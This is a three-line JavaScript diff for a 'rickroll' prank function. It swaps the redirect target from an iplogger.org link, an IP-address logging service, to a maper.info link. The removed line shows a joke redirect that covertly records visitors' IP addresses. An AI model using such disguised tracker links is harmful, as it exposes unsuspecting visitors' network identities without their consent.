@@ -1,3 +1,3 @@
 function rickroll() {
-    window.location.href = "https://iplogger.org/29auc6";
+    window.location.href = "https://maper.info/listfull/s3zrdX99Mf";
 }
